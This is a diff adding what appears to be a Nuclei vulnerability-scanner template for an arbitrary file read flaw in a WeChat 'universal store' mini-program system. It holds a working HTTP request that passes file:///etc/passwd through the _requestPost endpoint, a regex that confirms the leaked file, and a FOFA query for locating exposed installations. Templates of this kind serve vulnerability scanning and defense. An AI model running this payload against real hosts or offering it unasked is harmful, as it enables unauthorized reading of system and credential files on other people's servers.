@@ -1,0 +1,29 @@
+id: wechat-stroe-app-fileread
+
+info:
+  name: 微信万能门店小程序系统 _requestPost - 任意文件读取漏洞
+  author: qwtd
+  severity: high
+  description: 万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。支持后台一键扫码上传小程序，和后台通用模板。微信万能门店小程序系统存在任意文件读取漏洞
+  reference:
+    - https://wiki.wy876.cn/#/./%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E5%BE%AE%E4%BF%A1%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F_requestPost%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
+  metadata:
+    max-request: 1
+    fofa-query: "/comhome/cases/index.html"
+    verified: true
+  tags: 微信万能门店小程序系统
+
+http:
+  - raw:
+      - |
+        GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
